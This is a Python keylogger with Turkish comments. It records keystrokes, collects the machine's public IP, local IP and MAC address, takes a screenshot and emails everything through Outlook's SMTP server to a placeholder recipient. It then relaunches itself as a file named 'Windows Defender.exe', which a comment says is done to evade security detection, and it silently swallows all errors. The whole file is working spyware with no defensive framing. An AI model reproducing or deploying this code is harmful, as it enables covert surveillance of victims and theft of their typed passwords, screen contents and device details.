import keyboard
import os
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pyautogui
import requests
import socket
import uuid

final = ""


# klavye kaydi ve ip gibi bilgilerini aliyoruz
def record():
    try:
        recorded = keyboard.record(until="enter")
        global final

        # klavye kayitlarında basıldığı an down ve bırakıldığı anda up eventi oluştuğu için daha rahat okunulabilir bir hale çeviriyoruz
        for key in recorded:
            if key.event_type == "down":
                if len(key.name) == 1:
                    final += key.name
                elif len(key.name) > 1:
                    final += " "

        # Global ip adresini alıyoruz
        response = requests.get("http://checkip.dyndns.org")
        globalip_address = response.text.strip()
        globalip_address = globalip_address[75:89]

        # ipv4 adresini alıyoruz
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        # mac adresini alıyoruz
        mac_int = uuid.getnode()
        # hexadecimal düzene çeviriyoruz
        mac_hex = hex(mac_int)
        # düzenli bir hale getiriyoruz
        mac_parts = [mac_hex[i:i + 2] for i in range(0, len(mac_hex), 2)]
        mac_address = ":".join(mac_parts)

        final += "\n" + globalip_address + "\n" + ip_address + "\n" + mac_address

    except:
        pass

    screenshoot()


# ekran görünütüsü aliyoruz ve mail gönderme fonksiyonunu çağırıyoruz
def screenshoot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        pass
    except:
        pass
    sendmail()


# mail gönderdiğimiz kısım ekran görüntüsü alıp kaydettiğimiz dosyada burada maile eklenip mail gönderildikten sonra dosya siliniyor
def sendmail():
    try:
        # resim dosyası kütüphane aracığıyla doğru şekilde açılıp bir değere eklenerek mailimize ekleniyor
        with open("screenshot.png", "rb") as f:
            resim = f.read()
        resim_mime = MIMEImage(resim, name="screenshot.png")

        msg = MIMEMultipart()
        msg["From"] = "gönderici emaili"
        msg["To"] = "alıcı emaili"
        msg["Subject"] = "Resim dosyası eklenmiş e-posta"

        # Mesajın içeriği
        mesaj = final
        text = MIMEText(mesaj)
        msg.attach(text)

        # Resim dosyasını ekleyin
        msg.attach(resim_mime)

        # SMTP sunucusu adresi ve port numarası(hotmail icin)
        SMTP_SERVER = "smtp-mail.outlook.com"
        SMTP_PORT = 587

        # Göndereceğiniz mail adresi ve şifresi
        sender = "gönderici email"
        password = "gönderici emailin şifresi"

        # SMTP bağlantısını açıyoruz
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.ehlo()  # Sunucuya bağlantı açılışını bildiriyoruz
            server.starttls()  # Bağlantıyı şifreli hale getiriyoruz
            server.login(sender, password)  # Mail hesabına giriş yapıyoruz
            server.send_message(msg)
            server.close()
        os.remove("screenshot.png")
    except:
        pass
    parry()


# işlem bittikten sonra kendinden başka bir tane açıp kendini kapatıyor eğer bu kısım olmazsa uzun süre kullanıldığında güvenlik duvarı yakalayabiliyor
def parry():
    try:
        # Başka bir exe dosyasını açmak için
        os.startfile(os.getcwd() + "/Windows Defender.exe")

        # Exe dosyasını kapatmak için
        os._exit(0)
    except:
        pass

# programın başlangıcı
record()


# Try except'ler programın farklı bilgisayarlarda hata almaması için